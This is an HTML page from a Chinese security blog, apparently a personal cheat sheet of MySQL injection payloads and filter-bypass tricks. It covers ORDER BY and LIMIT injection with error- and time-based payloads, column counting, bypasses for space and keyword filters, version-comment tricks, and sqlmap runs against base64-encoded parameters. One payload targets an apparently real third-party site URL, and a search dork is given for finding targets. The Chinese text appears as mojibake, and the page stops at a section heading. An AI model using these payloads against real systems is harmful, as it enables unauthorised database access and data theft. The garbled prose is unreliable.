

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Tr0y">
  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, åšå®¢, ä¿¡æ¯å®‰å…¨">
  
    <meta name="description" content="è®°å½•ä¸€ä¸‹é‡åˆ°çš„ MySQL æ³¨å…¥çš„ Payload ä»¥åŠç»•è¿‡å§¿åŠ¿ï¼Œæ€»çš„æ¥è¯´å°±æ˜¯ä¸€äº›æŠ€å·§ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="MySQL æ³¨å…¥æŠ€å·§">
<meta property="og:url" content="https://www.tr0y.wang/2018/04/07/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/">
<meta property="og:site_name" content="Tr0y&#39;s Blog">
<meta property="og:description" content="è®°å½•ä¸€ä¸‹é‡åˆ°çš„ MySQL æ³¨å…¥çš„ Payload ä»¥åŠç»•è¿‡å§¿åŠ¿ï¼Œæ€»çš„æ¥è¯´å°±æ˜¯ä¸€äº›æŠ€å·§ã€‚">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/SQLi.png/cover">
<meta property="article:published_time" content="2018-04-07T14:16:03.000Z">
<meta property="article:modified_time" content="2023-12-13T10:02:13.000Z">
<meta property="article:author" content="Tr0y">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="æ³¨å…¥">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/SQLi.png/cover">
  
  
  
  <title>MySQL æ³¨å…¥æŠ€å·§ - Tr0y&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/my.css">
<link rel="stylesheet" href="/css/my-piczoom.css">
<link rel="stylesheet" href="/css/my-code.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"ä¸¨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"ğŸŒ§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  

  

  
    
  



  
<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Tr0y&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-books"></i>
                ç”Ÿå‘½çº¿
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-archive-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/gallery/">
                <i class="iconfont icon-images"></i>
                æ‘„å½±é›†
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="MySQL æ³¨å…¥æŠ€å·§"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2018-04-07 14:16" pubdate>
          2018å¹´4æœˆ7æ—¥ 14:16:03
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          5.4k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          34 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="ç»éªŒæ€»ç»“"
        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
        aria-expanded="true"
      >
        ç»éªŒæ€»ç»“
        <span class="list-group-count">(85)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
        
        
          
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2021/12/31/2021/" title="2021 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2021/01/12/flag-in-2021/" title="2021ï¼Œæ¥ç«‹äº› flag å§"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021ï¼Œæ¥ç«‹äº› flag å§</span>
        </a>
      
    
      
      
        <a href="/2023/01/31/2022/" title="2022 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2022 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2024/03/15/2023/" title="2023 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 äº‘å—ä¹‹æ—…"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 äº‘å—ä¹‹æ—…</span>
        </a>
      
    
      
      
        <a href="/2025/03/14/2024/" title="2024 å¹´åº¦æ€»ç»“"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 å¹´åº¦æ€»ç»“</span>
        </a>
      
    
      
      
        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 ğŸ‡«ğŸ‡¯ æ–æµä¹‹æ—…"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 ğŸ‡«ğŸ‡¯ æ–æµä¹‹æ—…</span>
        </a>
      
    
      
      
        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF æŒ‡åŒ—"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CSRF æŒ‡åŒ—</span>
        </a>
      
    
      
      
        <a href="/2017/06/07/CtfMiscStega/" title="CTF æ‚é¡¹ä¹‹éšå†™æœ¯"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CTF æ‚é¡¹ä¹‹éšå†™æœ¯</span>
        </a>
      
    
      
      
        <a href="/2020/09/14/DNS-1-basic/" title="DNS å®‰å…¨ï¼ˆä¸€ï¼‰ï¼šåŸºç¡€çŸ¥è¯†å¤ä¹ "
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">DNS å®‰å…¨ï¼ˆä¸€ï¼‰ï¼šåŸºç¡€çŸ¥è¯†å¤ä¹ </span>
        </a>
      
    
      
      
        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
          <span class="category-post">More...</span>
        </a>
        
  </div>

          
  
    
    
    
    <div class="category-sub row nomargin-x">
      <a class="category-subitem collapsed
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="è¿‡ç¨‹è®°å½•"
        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
        aria-expanded="false"
      >
        è¿‡ç¨‹è®°å½•
        <span class="list-group-count">(1)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 å¼ºç½‘æ¯ä¸‰é“ pyjail çš„é¢˜è§£"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 å¼ºç½‘æ¯ä¸‰é“ pyjail çš„é¢˜è§£</span>
        </a>
      
    
  </div>

        
      </div>
    </div>
  
        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">MySQL æ³¨å…¥æŠ€å·§</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2 å¹´å‰
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>è®°å½•ä¸€ä¸‹é‡åˆ°çš„ MySQL æ³¨å…¥çš„ Payload ä»¥åŠç»•è¿‡å§¿åŠ¿ï¼Œæ€»çš„æ¥è¯´å°±æ˜¯ä¸€äº›æŠ€å·§ã€‚</p>
<span id="more"></span>
<h2 id="bypass">Bypass</h2>
<h3 id="null-ä»£æ›¿-union">null ä»£æ›¿ union</h3>
<p>é‡åˆ° union çŒœå­—æ®µæ•°è·³è½¬æ—¶ï¼Œç”¨ null ä»£æ›¿</p>
<h3 id="order-by-æ³¨å…¥ç‚¹">Order by æ³¨å…¥ç‚¹</h3>
<p><code>order by</code> æ€§è´¨ï¼š</p>
<ol type="1">
<li>åˆ©ç”¨ order by å­å¥è¿›è¡Œå¿«é€ŸçŒœè§£è¡¨ä¸­çš„åˆ—æ•°</li>
<li>order by åé¢çš„æ•°ä¸èƒ½æ˜¯è¡¨è¾¾å¼</li>
</ol>
<p><strong>1=1 å¤„å°±æ˜¯ payload</strong><br />
æ„é€ ï¼š</p>
<ol type="1">
<li>IF(1=1,name,price)</li>
<li>(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END)</li>
<li>IFNULL</li>
<li>rand(1=1) ï¼Œrand(1=2)</li>
</ol>
<p>æŠ¥é”™ï¼š</p>
<ol type="1">
<li>IF(1=1,1, (select 1 union select 2))</li>
<li>(select 1 regexp if(1=1,1,0x00))</li>
<li>updatexml</li>
<li>extractvalue</li>
</ol>
<p>æ—¶é—´ï¼š</p>
<ol type="1">
<li>if(1=1, 1, (SELECT(1)FROM(SELECT(SLEEP(2)))test))</li>
</ol>
<p>å¯¹äº <code>desc/asc</code> åçš„æ³¨å…¥ç‚¹ï¼Œç›´æ¥åŠ  <code>,</code> ç„¶åæ‹¼æ¥è¯­å¥å³å¯ï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://www.teletec.com.pk/<span class="hljs-keyword">include</span>/products.php?sb=id <span class="hljs-keyword">desc</span>,(<span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-number">0x27202020</span>,floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-number">-1</span>)))<br></code></pre></td></tr></table></figure>
<h3 id="limit-æ³¨å…¥ç‚¹">limit æ³¨å…¥ç‚¹</h3>
<p>æ–¹æ³•ä»…é€‚ç”¨äº 5.0.0 &lt; mysql &lt; 5.6.6 çš„ç‰ˆæœ¬</p>
<p><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT [æ³¨å…¥ç‚¹]</code></p>
<p>limit å…³é”®å­—åé¢è¿˜æœ‰ <code>PROCEDURE</code> å’Œ <code>INTO</code> å…³é”®å­—ï¼Œ<code>into</code> å…³é”®å­—å¯ä»¥ç”¨æ¥å†™æ–‡ä»¶ï¼Œä½†è¿™åœ¨ä¸é‡è¦ï¼Œè¿™é‡Œçš„é‡ç‚¹æ˜¯ <code>PROCEDURE</code> å…³é”®å­—ã€‚MySQL é»˜è®¤å¯ç”¨çš„å­˜å‚¨è¿‡ç¨‹åªæœ‰ <code>ANALYSE</code>ã€‚</p>
<p>æŠ¥é”™ï¼š</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">mysql&gt; <span class="hljs-keyword">SELECT</span> field <span class="hljs-keyword">FROM</span> user <span class="hljs-keyword">WHERE</span> id &gt;<span class="hljs-number">0</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> <span class="hljs-title function_">analyse</span><span class="hljs-params">(extractvalue(rand()</span>,<span class="hljs-title function_">concat</span><span class="hljs-params">(0x3a,version()</span>)),1);<br></code></pre></td></tr></table></figure>
<p>å¦‚æœä¸æ”¯æŒæŠ¥é”™æ³¨å…¥çš„è¯ï¼Œè¿˜å¯ä»¥åŸºäºæ—¶é—´æ³¨å…¥ï¼Œç›´æ¥ä½¿ç”¨ sleep ä¸è¡Œï¼Œéœ€è¦ç”¨ BENCHMARK ä»£æ›¿ï¼š</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">SELECT</span> field <span class="hljs-keyword">FROM</span> table <span class="hljs-keyword">WHERE</span> id &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">PROCEDURE</span> <span class="hljs-title function_">analyse</span><span class="hljs-params">((<span class="hljs-keyword">select</span> extractvalue(rand()</span>,<span class="hljs-title function_">concat</span><span class="hljs-params">(0x3a,(<span class="hljs-keyword">IF</span>(MID(version()</span>,1,1) <span class="hljs-title function_">LIKE</span> 5, <span class="hljs-title function_">BENCHMARK</span><span class="hljs-params">(5000000,SHA1(1)</span>),1))))),1)<br></code></pre></td></tr></table></figure>
<p>SELECT ... INTO:</p>
<p><code>SELECT username FROM Users limit 1,&#123;INJECTION POINT&#125;;</code></p>
<p><code>1 INTO @,@,@</code> The used SELECT statements have a different number of columns</p>
<p><code>1 INTO @,@</code> æ²¡æœ‰æŠ¥é”™å°±è¯´æ˜åªæœ‰ä¸¤åˆ—</p>
<h3 id="fpd">FPD</h3>
<p>mysql ä¸­ï¼Œlimit åçš„ <code>limit 0, 0</code> æˆ– <code>limit 0,/**/1</code> å¯èƒ½ä¼šé€ æˆè·¯å¾„æ³„éœ²</p>
<h3 id="åˆ¤æ–­å·²çŸ¥è¡¨åçš„å­—æ®µæ•°">åˆ¤æ–­å·²çŸ¥è¡¨åçš„å­—æ®µæ•°</h3>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> passwd <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> id = &#123;INJECTION <span class="hljs-type">POINT</span>&#125;;<br></code></pre></td></tr></table></figure>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">AND (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> SOME_EXISTING_TABLE) = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p><code>1 AND (SELECT * FROM Users) = 1</code> =&gt; <code>Operand should contain 3 column(s)</code></p>
<p>è¯´æ˜åªæœ‰ 3 åˆ—</p>
<h3 id="andor-åæ’å…¥å­—ç¬¦ç»•è¿‡ç©ºæ ¼">and/or åæ’å…¥å­—ç¬¦ç»•è¿‡ç©ºæ ¼</h3>
<p>ä»»æ„æ··åˆ+ - ~ !å¯ä»¥è¾¾åˆ°ç»•è¿‡ç©ºæ ¼çš„æ•ˆæœï¼ˆå¯ä»¥ç°åœ¨æœ¬åœ°æµ‹è¯•ï¼Œæ··åˆåéœ€è¦çš„å¥‡å¶æ•°å¯èƒ½ä¸åŒï¼‰</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span>(db) <span class="hljs-keyword">FROM</span> mysql.db <span class="hljs-keyword">WHERE</span> <span class="hljs-symbol">`Host`</span>=<span class="hljs-string">&#x27;localhost&#x27;</span> <span class="hljs-keyword">and</span>-++<span class="hljs-number">-1</span>=<span class="hljs-number">1</span>;éœ€è¦å¶æ•°ä¸ª--<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span>(db) <span class="hljs-keyword">FROM</span> mysql.db <span class="hljs-keyword">WHERE</span> <span class="hljs-symbol">`Host`</span>=<span class="hljs-string">&#x27;localhost&#x27;</span> <span class="hljs-keyword">and</span>!!~~~~!<span class="hljs-number">1</span>=<span class="hljs-number">1</span>;éœ€è¦å¥‡æ•°ä¸ª!<br></code></pre></td></tr></table></figure>
<h3 id="ç‰ˆæœ¬å·å­—ç¬¦">ç‰ˆæœ¬å·å­—ç¬¦</h3>
<p>mysql çš„ç‰ˆæœ¬å·å­—ç¬¦å³ <code>/*!(ç‰ˆæœ¬å·)*/</code></p>
<p>è‹¥ç»™å‡ºçš„ç‰ˆæœ¬å°äºç­‰äºæ•°æ®åº“ç‰ˆæœ¬ï¼Œåˆ™ mysql ä¼šåƒæ‰ç‰ˆæœ¬å·åå‰©ä¸‹åé¢çš„å­—ç¬¦ã€‚</p>
<p>è‹¥å¤§äºï¼Œåˆ™åƒæ‰æ‰€æœ‰å­—ç¬¦ã€‚ï¼ˆæˆ‘çš„æ˜¯ 5.7.21ï¼‰</p>
<p><code>select * from mysql.user where 1/*!50722aaaa*/;</code></p>
<p>è¿”å›æ­£å¸¸ç»“æœ</p>
<p><code>select * from mysql.user where 1/*!50721aaaa*/;</code></p>
<p>è¿”å›ï¼š</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">ERROR <span class="hljs-number">1064</span> (<span class="hljs-number">42000</span>): You have <span class="hljs-keyword">an</span> error <span class="hljs-keyword">in</span> your SQL syntax; check <span class="hljs-keyword">the</span> manual that corresponds <span class="hljs-built_in">to</span> your MySQL server <span class="hljs-built_in">version</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> syntax <span class="hljs-built_in">to</span> use near <span class="hljs-string">&#x27;aaaa*/&#x27;</span> <span class="hljs-keyword">at</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p><code>SELECT 1/*!00000union/*!00000select/*!00000user(*/);</code></p>
<p>å¯¹äºå°äºæˆ–ç­‰äºç‰ˆæœ¬å·çš„è¯­å¥å°±ä¼šæ‰§è¡Œã€‚å…¶å®å°±æ˜¯æŠŠç‰ˆæœ¬å·å½“ä½œç©ºæ ¼ä½¿ç”¨ã€‚</p>
<p><code>/*!*/</code> ä¹Ÿå¯ä»¥æ’å…¥è¡¨ç­‰ç­‰ï¼š</p>
<p><code>select /*!id*/ from wlanpwd;</code></p>
<h3 id="illegal-mix-of-collations">Illegal mix of collations</h3>
<ol type="1">
<li><p>ç°è±¡ï¼š<br />
<code>SQL Error : Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,SYSCONST) for operation 'UNION'</code><br />
æ˜¯ä¸€ç§ä¹±ç é—®é¢˜ï¼Œå› ä¸ºç¼–ç çš„ç¼˜æ•…å­—ç¬¦é›†çš„ç¼–ç ä¸åŒæ‰€å¯¼è‡´çš„ã€‚</p></li>
<li><p>è§£å†³ï¼š</p>
<ol type="1">
<li><code>convert(version() using latin1)</code></li>
<li><code>aes_decrypt(aes_encrypt(version(),1),1)</code></li>
<li><code>unhex(hex(@@version))</code></li>
<li><code>cast(version()+as+binary)</code></li>
<li><code>convert(version(),binary)</code></li>
<li><code>convert(version()+using+binary)</code></li>
</ol></li>
</ol>
<h3 id="base64-å˜å½¢">Base64 å˜å½¢</h3>
<ol type="1">
<li>æœç´ å¼•æ“å…³é”®è¯ï¼š<code>inurl:php?aWQ9</code></li>
<li>sqlmap å¦‚ä½•è·‘ base64 åŠ å¯†äº†çš„æ³¨å…¥ç‚¹<br />
è¿™é‡Œçš„ base64 ä¸ä»…æ˜¯å€¼ä¸º base64ï¼Œå‚æ•°çš„åå­—éƒ½ä¸€èµ· base64 äº†ã€‚<br />
å°†ä»¥ä¸‹ demo ä¿å­˜ä¸º sqlmap.php<br />
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;id=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;http://www.xxxx.com/project_detail.php?<span class="hljs-subst">&#123;$id&#125;</span>&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><br />
<code>sqlmap.py -u "http://localhost/sqlmap.php?id=12" -v3 --dbs</code><br />
è‹¥æ˜¯ä»…æœ‰å‚æ•°å€¼è¿›è¡Œäº† base64ï¼Œé‚£ä¹ˆç”¨ sqlmap å³å¯ï¼š<br />
<code>sqlmap -u http://xxxx.com/index.php?tel=ltenig9yicc4occ9jzg5 --tamper base64encode.py â€“ dbs</code></li>
</ol>
<h3 id="php-çš„-empty-ä¸-mysql">PHP çš„ empty() ä¸ Mysql</h3>
<p>mysql çš„ç±»å‹å¼ºåˆ¶è½¬æ¢å¯ç»•è¿‡ PHP ä¸­ <code>empty()</code> å‡½æ•°å¯¹ 0 çš„ false è¿”å›ã€‚</p>
<p>ä¾‹å¦‚ï¼šæäº¤ <code>/?test=0axxx</code> -&gt; <code>empty($_GET['test'])</code> =&gt; è¿”å› <code>çœŸ</code></p>
<p>ä½†æ˜¯ mysql ä¸­æäº¤å…¶ <code>0axxx</code> åˆ°æ•°å­—å‹æ—¶å¼ºåˆ¶è½¬æ¢æˆæ•°å­— 0</p>
<h3 id="æ‹¬å·ä»£æ›¿ç©ºæ ¼">æ‹¬å·ä»£æ›¿ç©ºæ ¼</h3>
<p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œé€—å·çš„æ³¨å…¥ï¼Œå¯ä½¿ç”¨æ‹¬å·åŒ…è£¹ç»•è¿‡ã€‚å…·ä½“å¦‚é‡åˆ° <code>select from</code>ï¼ˆå…³é”®å­—ç©ºæ ¼åˆ¤æ–­çš„æ­£åˆ™ï¼Œä¸”å‰”é™¤ <code>/**/</code> ç­‰ï¼‰å¯ä½¿ç”¨æ‹¬å·åŒ…è£¹æŸ¥è¯¢å­—æ®µç»•è¿‡ã€‚<br />
ä¾‹å¦‚ï¼š<br />
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span>(<span class="hljs-keyword">user</span>)<span class="hljs-keyword">from</span>(mysql.<span class="hljs-keyword">user</span>);<br><span class="hljs-keyword">select</span>&#123;x(<span class="hljs-keyword">user</span>)&#125;<span class="hljs-keyword">from</span>&#123;y(mysql.<span class="hljs-keyword">user</span>)&#125;;<br><span class="hljs-keyword">select</span>&#123;x+<span class="hljs-keyword">user</span>&#125;<span class="hljs-keyword">from</span>&#123;x(mysql.<span class="hljs-keyword">user</span>)&#125;<br></code></pre></td></tr></table></figure></p>
<h3 id="å®½å­—èŠ‚æ³¨å…¥">å®½å­—èŠ‚æ³¨å…¥</h3>
